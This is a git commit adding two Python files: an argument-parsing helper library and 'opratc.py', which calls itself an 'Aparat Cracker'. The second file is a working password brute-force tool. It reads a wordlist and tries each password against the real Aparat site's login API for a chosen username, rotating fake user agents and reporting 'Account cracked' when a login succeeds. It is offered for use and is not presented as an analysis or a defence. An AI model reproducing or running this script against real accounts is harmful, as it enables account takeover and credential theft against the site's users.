e023418989fe37a2ea9dc9ace3019a75ae59318c
Rubier <166219464+Rubier-Project@users.noreply.github.com>
2024-09-24 22:13:41 +0330

    Add files via upload

---
+++ BufferArgv.py
@@ -0,0 +1,453 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# dev: Host1let
+"""
+BufferArgv Library
+~~~~~~
+
+Controll Your Data in Terminal 
+```
+from Buffer.BufferArgv import BufferConsole
+```
+"""
+
+import sys
+import json
+
+class BufferAttribute(object):
+    def __init__(self, dic):
+        self.dic = dic
+        for key in dic.keys():
+            setattr(self, key, dic[key])
+
+class BufferForm(BufferAttribute):
+    def __init__(self, dic):
+        super().__init__(dic)
+        
+class BufferList(object):
+    def __init__(self,
+                 List: list = [],
+                 ):
+        
+        self.list = List
+        
+    def parse(self):
+        bfd = {}
+
+        for i in range(len(self.list)):
+            bfd[str(i+1)] = self.list[i]
+
+        return bfd
+
+    def isexists(self, target):
+        if target in self.list:
+            return True
+        else:return False
+
+    def isinfrontof(self, target, indexes):
+        isit = False
+
+        if target in self.list:
+            try:
+                indx = self.list.index(target)
+                if indx == indexes:
+                    isit = True
+                else:isit = False
+            except Exception as e:return e
+        
+        return isit
+    
+    def indexexists(self, target):
+        if target in self.list:
+            return self.list.index(target)
+        else:return False
+
+class Things(object):
+    def __init__(self) -> None:
+        self.def_attrs = ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']
+
+    def __str__(self) -> str:
+        return json.dumps(dir(self), indent=2)
+    
+    @property
+    def options(self) -> list:
+        opts = []
+
+        for item in dir(self):
+            if item.startswith("__") and item in self.def_attrs:pass
+            else:opts.append(item)
+
+        opts.remove("def_attrs")
+        opts.remove("options")
+        
+        return opts
+
+class BufferConsole(object):
+    def __init__(self):
+        self.last_things = Things()
+        self.handlers = []
+        self.buffer_list = BufferList
+        self.modes = [
+            'in_front_of',
+            'on_call',
+            'equals_with'
+        ]
+        self.string_abs = [
+            "str",
+            "string",
+            "strings"
+        ]
+        self.int_abs = [
+            "int",
+            "integer",
+            "number"
+        ]
+        self.dict_abs = [
+            "dict",
+            "dictionary",
+            "json"
+        ]
+        self.bool_abs = [
+            "bool",
+            "boolean",
+            "true-false"
+        ]
+    
+    def getDictArgv(self):
+        return BufferList(sys.argv).parse()
+    
+    def isArray(self, array: str):
+        try:
+            return {"is_array": True, "array": json.loads(array)}
+        except:return {"is_array": False}
+
+    def isBoolean(self, boolean: str):
+        try:
+            if boolean.startswith("t"):
+                return {"is_boolean": True, "boolean": bool("T"+boolean[1:])}
+            elif boolean.startswith("f"):
+                return {"is_boolean": True, "boolean": bool("F"+boolean[1:])}
+            else:return {"is_boolean": True, "boolean": bool(boolean)}
+        except:return {"is_boolean": False}
+    
+    def addFlag(self, *flags, mode: str = "in_front_of", obj_type: str = "str"):
+        def decorator(func):
+            self.handlers.append({func: {"flags": list(set(flags)), "mode": mode, "type": obj_type.lower()}})
+            return func
+        return decorator
+    
+    def setFilter(self, flags_list: list, err_message: str, _exit: bool = True):
+        """
+        Check The all arguments and detect the mistakes\n
+
+        Use 'B@ARGV' key word in your err_message to see invalid argument:\n
+
+        buffer.setFilter(\n
+            flags_list=[ '-h', '--help' ],\n
+            err_message="Invalid Key: B@ARGV",
+            _exit=True
+            )
+
+        Parameters:
+            - **flags_list** (list): The flags used in the script.
+            - **err_message** (str): Message printed if an invalid argument is detected.
+            - **_exit** (bool): If True, the program will terminate upon detecting an invalid argument.
+        """
+
+        flags = list(set(flags_list))
+        argvs = sys.argv
+
+        for argv in argvs:
+            if argv.startswith("-"):
+                if not argv in flags:
+                    print(err_message.replace("B@ARGV", argv))
+
+                    if _exit:
+                        exit(1)
+
+    def trust(self):
+        for handler in self.handlers:
+            func = list(handler.keys())[0]
+            flags = handler[func]['flags']
+            mode = handler[func]['mode']
+            type = handler[func]['type']
+
+            argv = self.buffer_list(sys.argv).parse()
+            arg_key = list(argv.keys())
+            arg_val = list(argv.values())
+
+            if mode == "in_front_of":
+
+                for flag in flags:
+
+                    setattr(self.last_things, flag.replace("-", ""), "NONECALL")
+
+                    if flag in arg_val:
+                        arg_index = arg_val.index(flag)
+                        ifo_key = str(arg_index+2)
+                        cleared_key = argv[str(arg_index+1)].replace("-", "")
+
+                        if ifo_key in arg_key:
+
+                            if type in self.string_abs:
+                                setattr(self.last_things, cleared_key, argv[ifo_key])
+                                
+                            elif type in self.int_abs:
+                                if argv[ifo_key].isdigit():
+                                    setattr(self.last_things, cleared_key, int(argv[ifo_key]))
+                                else:setattr(self.last_things, cleared_key, argv[ifo_key])
+
+                            elif type in self.dict_abs:
+                                status = self.isArray(argv[ifo_key])
+
+                                if status['is_array']:
+                                    setattr(self.last_things, cleared_key, status['array'])
+                                else:setattr(self.last_things, cleared_key, argv[ifo_key])
+                                
+                            elif type in self.bool_abs:
+                                status = self.isBoolean(argv[ifo_key])
+
+                                if status['is_boolean']:
+                                    setattr(self.last_things, cleared_key, status['boolean'])
+                                else:setattr(self.last_things, cleared_key, argv[ifo_key])
+                        else:
+                            setattr(self.last_things, cleared_key, "Null")
+
+            elif mode == "on_call":
+                for flag in flags:
+
+                    setattr(self.last_things, flag.replace("-", ""), "NONECALL")
+
+                    if flag in arg_val:
+                        arg_index = arg_val.index(flag)
+                        k = argv[str(arg_index+1)]
+                        cleared_key = k.replace("-", "")
+
+                        if k in arg_val:
+                            setattr(self.last_things, cleared_key, True)
+
+                        else:
+                            setattr(self.last_things, cleared_key, False)
+
+            elif mode == "equals_with":
+                for flag in flags:
+                    setattr(self.last_things, flag.replace("-", ""), "NONECALL")
+                    for arg in sys.argv:
+                        if arg.startswith(flag):
+                            if "=" in arg:
+                                splitted_data = arg.split("=")[-1]
+
+                                if not splitted_data.strip() == "":
+
+                                    if type in self.string_abs:
+                                        setattr(self.last_things, flag.replace("-", ""), splitted_data)
+
+                                    elif type in self.int_abs:
+                                        if splitted_data.isdigit():
+                                            setattr(self.last_things, flag.replace("-", ""), int(splitted_data))
+                                        else:
+                                            setattr(self.last_things, flag.replace("-", ""), splitted_data)
+
+                                    elif type in self.dict_abs:
+                                        status = self.isArray(splitted_data)
+                                        
+                                        if status['is_array']:
+                                            setattr(self.last_things, flag.replace("-", ""), status['array'])
+                                        else:setattr(self.last_things, flag.replace("-", ""), splitted_data)
+                                    
+                                    elif type in self.bool_abs:
+                                        status = self.isBoolean(splitted_data)
+
+                                        if status['is_boolean']:
+                                            setattr(self.last_things, flag.replace("-", ""), status['boolean'])
+                                        else:setattr(self.last_things, flag.replace("-", ""), splitted_data)
+                                    else:setattr(self.last_things, flag.replace("-", ""), "NONEEQUALS")
+                                else:setattr(self.last_things, flag.replace("-", ""), splitted_data)
+                            else:setattr(self.last_things, flag.replace("-", ""), "NONEEQUALS")
+                        
+            func(self.last_things)
+
+class BufferString(object):
+    def __init__(self, string: str):
+        assert isinstance(string, str), exit("The Self@BufferString did not get a string value")
+        self.string = string.split()
+        self.last_things = Things()
+        self.handlers = []
+        self.buffer_list = BufferList
+        self.modes = [
+            'in_front_of',
+            'on_call'
+        ]
+        self.string_abs = [
+            "str",
+            "string",
+            "strings"
+        ]
+        self.int_abs = [
+            "int",
+            "integer",
+            "number"
+        ]
+        self.dict_abs = [
+            "dict",
+            "dictionary",
+            "json"
+        ]
+        self.bool_abs = [
+            "bool",
+            "boolean",
+            "true-false"
+        ]
+    
+    def getDictArgv(self):
+        return BufferList(self.string).parse()
+    
+    def isArray(self, array: str):
+        try:
+            return {"is_array": True, "array": json.loads(array)}
+        except:return {"is_array": False}
+
+    def isBoolean(self, boolean: str):
+        try:
+            if boolean.startswith("t"):
+                return {"is_boolean": True, "boolean": bool("T"+boolean[1:])}
+            elif boolean.startswith("f"):
+                return {"is_boolean": True, "boolean": bool("F"+boolean[1:])}
+            else:return {"is_boolean": True, "boolean": bool(boolean)}
+        except:return {"is_boolean": False}
+    
+    def addFlag(self, *flags, mode: str = "in_front_of", obj_type: str = "str"):
+        def decorator(func):
+            self.handlers.append({func: {"flags": list(set(flags)), "mode": mode, "type": obj_type.lower()}})
+            return func
+        return decorator
+    
+    def setFilter(self, flags_list: list, err_message: str, _exit: bool = True):
+        """
+        Check The all arguments and detect the mistakes\n
+
+        Use 'B@ARGV' key word in your err_message to see invalid argument:\n
+
+        buffer.setFilter(\n
+            flags_list=[ '-h', '--help' ],\n
+            err_message="Invalid Key: B@ARGV",
+            _exit=True
+            )
+
+        Parameters:
+            - **flags_list** (list): The flags used in the script.
+            - **err_message** (str): Message printed if an invalid argument is detected.
+            - **_exit** (bool): If True, the program will terminate upon detecting an invalid argument.
+        """
+
+        flags = list(set(flags_list))
+        argvs = self.string
+
+        for argv in argvs:
+            if argv.startswith("-"):
+                if not argv in flags:
+                    print(err_message.replace("B@ARGV", argv))
+
+                    if _exit:
+                        exit(1)
+
+    def trust(self):
+        for handler in self.handlers:
+            func = list(handler.keys())[0]
+            flags = handler[func]['flags']
+            mode = handler[func]['mode']
+            type = handler[func]['type']
+
+            argv = self.buffer_list(self.string).parse()
+            arg_key = list(argv.keys())
+            arg_val = list(argv.values())
+
+            if mode == "in_front_of":
+
+                for flag in flags:
+
+                    setattr(self.last_things, flag.replace("-", ""), "NONECALL")
+
+                    if flag in arg_val:
+                        arg_index = arg_val.index(flag)
+                        ifo_key = str(arg_index+2)
+                        cleared_key = argv[str(arg_index+1)].replace("-", "")
+
+                        if ifo_key in arg_key:
+
+                            if type in self.string_abs:
+                                setattr(self.last_things, cleared_key, argv[ifo_key])
+                                
+                            elif type in self.int_abs:
+                                if argv[ifo_key].isdigit():
+                                    setattr(self.last_things, cleared_key, int(argv[ifo_key]))
+                                else:setattr(self.last_things, cleared_key, argv[ifo_key])
+
+                            elif type in self.dict_abs:
+                                status = self.isArray(argv[ifo_key])
+
+                                if status['is_array']:
+                                    setattr(self.last_things, cleared_key, status['array'])
+                                else:setattr(self.last_things, cleared_key, argv[ifo_key])
+                                
+                            elif type in self.bool_abs:
+                                status = self.isBoolean(argv[ifo_key])
+
+                                if status['is_boolean']:
+                                    setattr(self.last_things, cleared_key, status['boolean'])
+                                else:setattr(self.last_things, cleared_key, argv[ifo_key])
+                        else:
+                            setattr(self.last_things, cleared_key, "Null")
+
+            elif mode == "on_call":
+                for flag in flags:
+
+                    setattr(self.last_things, flag.replace("-", ""), "NONECALL")
+
+                    if flag in arg_val:
+                        arg_index = arg_val.index(flag)
+                        k = argv[str(arg_index+1)]
+                        cleared_key = k.replace("-", "")
+
+                        if k in arg_val:
+                            setattr(self.last_things, cleared_key, True)
+
+                        else:
+                            setattr(self.last_things, cleared_key, False)
+
+            elif mode == "equals_with":
+                for flag in flags:
+                    setattr(self.last_things, flag.replace("-", ""), "NONECALL")
+                    for arg in self.string:
+                        if arg.startswith(flag):
+                            if "=" in arg:
+                                splitted_data = arg.split("=")[-1]
+                                if not splitted_data.strip() == "":
+
+                                    if type in self.string_abs:
+                                        setattr(self.last_things, flag.replace("-", ""), splitted_data)
+
+                                    elif type in self.int_abs:
+                                        if splitted_data.isdigit():
+                                            setattr(self.last_things, flag.replace("-", ""), int(splitted_data))
+                                        else:
+                                            setattr(self.last_things, flag.replace("-", ""), splitted_data)
+
+                                    elif type in self.dict_abs:
+                                        status = self.isArray(splitted_data)
+                                        
+                                        if status['is_array']:
+                                            setattr(self.last_things, flag.replace("-", ""), status['array'])
+                                        else:setattr(self.last_things, flag.replace("-", ""), splitted_data)
+                                    
+                                    elif type in self.bool_abs:
+                                        status = self.isBoolean(splitted_data)
+
+                                        if status['is_boolean']:
+                                            setattr(self.last_things, flag.replace("-", ""), status['boolean'])
+                                        else:setattr(self.last_things, flag.replace("-", ""), splitted_data)
+                                    else:setattr(self.last_things, flag.replace("-", ""), splitted_data)
+                                else:setattr(self.last_things, flag.replace("-", ""), "NONEEQUALS")
+                            else:setattr(self.last_things, flag.replace("-", ""), "NONEEQUALS")
+                        
+            func(self.last_things)
---
+++ opratc.py
@@ -0,0 +1,197 @@
+import httpx
+import hashlib
+import fake_useragent
+import rich.table
+import BufferArgv
+import time
+import rich
+import os
+import sys
+
+os.system("")
+print("\033[00m", end="")
+
+class AparatEncryption(object):
+    def __init__(
+            self,
+            password: str
+    ) -> None:
+        self.password = str(password) if not isinstance(password, str) else password
+        self.key = self.master(self.sec(self.password))
+
+    def master(self, sec_key: str = ""):
+        sha1 = hashlib.sha1()
+        sha1.update(sec_key.encode())
+        return sha1.hexdigest()
+    
+    def sec(self, key: str = ""):
+        md5 = hashlib.md5()
+        md5.update(key.encode())
+        return md5.hexdigest()
+
+class AparatClient(object):
+    def __init__(
+            self
+    ) -> None:
+        self.url = "https://www.aparat.com/etc/api/"
+        self.fua = fake_useragent.FakeUserAgent()
+        self.cli = httpx.Client()
+        self.time_out = httpx.USE_CLIENT_DEFAULT
+        self.encryption = AparatEncryption
+
+    def login(
+            self,
+            username: str,
+            password: str,
+            timeout: int = -999
+    ) -> dict:
+        
+        enc_key = self.encryption(password)
+        prepared_url = self.url + "login/luser/" + username + "/lpass/" + enc_key.key
+        prepared_header = { "User-Agent": self.fua.random }
+
+        try:
+            result = self.cli.get(prepared_url, headers=prepared_header, timeout=timeout if timeout != -999 else self.time_out)
+            result = result.json()
+            result['opratc_err'] = False
+            result['password'] = password
+            result['key'] = enc_key.key
+            return result
+        except Exception as Error_Aparat:
+            return {"opratc_err": True, "message": str(Error_Aparat),
+                    "password": password, "key": enc_key.key}
+
+class Opratc(object):
+    def __init__(self) -> None:
+        pass
+
+    def log(self, msg: str) -> None:
+        ontime = time.strftime("%H:%M:%S")
+        print(f"[\033[92m+\033[00m]-[\033[93m{ontime}\033[00m]> {msg}")
+    
+    def err(self, msg: str) -> None:
+        ontime = time.strftime("%H:%M:%S")
+        print(f"[\033[91m-\033[00m]-[\033[93m{ontime}\033[00m]> {msg}")
+
+    def isHumanReadable(self, file_path):
+        try:
+            with open(file_path, 'r') as file:
+                content = file.read()
+                return all(ord(char) < 128 for char in content)
+        except UnicodeDecodeError:
+            return False
+
+# print(asyncio.run(AparatClient().login("imHostX", "enterItforX23")))
+buffer = BufferArgv.BufferConsole()
+console = rich.console.Console()
+client = AparatClient()
+opratc = Opratc()
+
+opratc.log("Software Homepage \033[4m\033[36mhttps://github.com/Rubier-Project/Opratc\033[00m")
+console.print()
+
+@buffer.addFlag("-t", "--timeout", obj_type="number")
+def onTimeout(to_obj: BufferArgv.Things):
+    if to_obj.t == "NONECALL" and to_obj.timeout == "NONECALL":
+        to_obj.t = "DEFAULT"
+        to_obj.timeout = "DEFAULT"
+    else:
+        time_outed = to_obj.t if to_obj.t != "NONECALL" and type(to_obj.t) == int else to_obj.timeout if to_obj.timeout != "NONECALL" and type(to_obj.timeout) == int  else "DEFAULT"
+        if time_outed in ("Null", "NONECALL"):
+            to_obj.t = "DEFAULT"
+            to_obj.timeout = "DEFAULT"
+        else:
+            to_obj.t = time_outed
+            to_obj.timeout = time_outed
+
+@buffer.addFlag("-o", "--open")
+def onFile(file_obj: BufferArgv.Things):
+    if file_obj.o == "NONECALL" and file_obj.open == "NONECALL":
+        if "-h" in sys.argv or "--help" in sys.argv:pass
+        else:
+            opratc.log("Flag \033[92m'-o'\033[00m | \033[92m'--open'\033[00m not found")
+            exit(1)
+
+    else: 
+        path = file_obj.o if file_obj.o != "Null" and file_obj.o != "" else file_obj.open if file_obj.open != "Null" and file_obj.open != "" else "Null"
+
+        if path in ("Null", "NONECALL"):
+            opratc.err("Path is not found")
+            exit(1)
+
+        elif not os.path.exists(path):
+            opratc.err("Path does not exist")
+            exit(1)
+
+        elif not os.path.isfile(path):
+            opratc.err("Path is not a file")
+            exit(1)
+
+        elif not opratc.isHumanReadable(path):
+            opratc.err("Path is not human readable")
+            exit(1)
+        
+        else:
+            content = open(path, 'r').read()
+            if content.count("\n") == 0:
+                opratc.err("File has invalid content")
+                exit(1)
+
+            else:splitted =  content.split("\n");setattr(file_obj, "password_list", splitted);opratc.log(f"\033[93m{len(splitted) - 1}\033[00m Password added")
+
+@buffer.addFlag("-u", "--username")
+def onUsername(user_obj: BufferArgv.Things):
+    if user_obj.u == "NONECALL" and user_obj.username == "NONECALL":
+        if "-h" in sys.argv or "--help" in sys.argv:pass
+        else:
+            opratc.err("Flag \033[92m'-u'\033[00m | \033[92m'--username'\033[00m not found")
+            exit(1)
+    
+    else:
+        username = user_obj.u if user_obj.u != "Null" and user_obj.u != "" else user_obj.username if user_obj.username != "Null" and user_obj.username != "" else "Null"
+
+        if username in ("Null", "NONECALL"):
+            opratc.err("Username was not set or not found")
+            exit(1)
+        else:
+            opratc.log(f"Username Seted: \033[92m'{username}'\033[00m")
+            timed = user_obj.t if not user_obj.t == "DEFAULT" else -999
+
+            for password in user_obj.password_list:
+                res = client.login(
+                    username,
+                    password,
+                    timed
+                )
+                if res['opratc_err']:
+                    opratc.err(f"Error for {username}:{password} ( \033[92m{res['message']}\033[00m )")
+                elif res['login']['type'] == "success":
+                    opratc.log("Account cracked")
+                    opratc.log(f"Hash Key: \033[92m'{res['key']}'\033[00m")
+                    rich.print(res['login'])
+                    exit(1)
+
+@buffer.addFlag("-h", "--help", mode="on_call")
+def onHelp(obj: BufferArgv.Things):
+    if obj.h == True or obj.help == True:
+        console.print("[bold] Aparat Cracker [/bold] :spider:", justify="center")
+        console.print()
+
+        table = rich.table.Table.grid(padding=1, pad_edge=True)
+        table.add_column("Arguments", no_wrap=True,
+                         justify="left", style="bold")
+        table.add_column("Description")
+
+        table.add_row("-h, --help", "[green]Print this message[/green]")
+        table.add_row("-t, --timeout [cyan]<TIMEOUT>[/cyan]", "Set Timeout ( [purple]Optional[/purple] )")
+        table.add_row("-o, --open [cyan]<FILEPATH>[/cyan]", "Open Password list File ( [purple]Necessary[/purple] )")
+        table.add_row("-u, --username [cyan]<USERNAME>[/cyan]", "Select the Target Username ( [purple]Necessary[/purple] )")
+        console.print(table)
+
+buffer.setFilter([
+    "-h", "--help",
+    "-t", "--timeout",
+    "-o", "--open",
+    "-u", "--username"
+], err_message="[\033[91m-\033[00m]-[\033[93m{ontime}\033[00m]> Invalid argument: B@ARGV")
+buffer.trust()
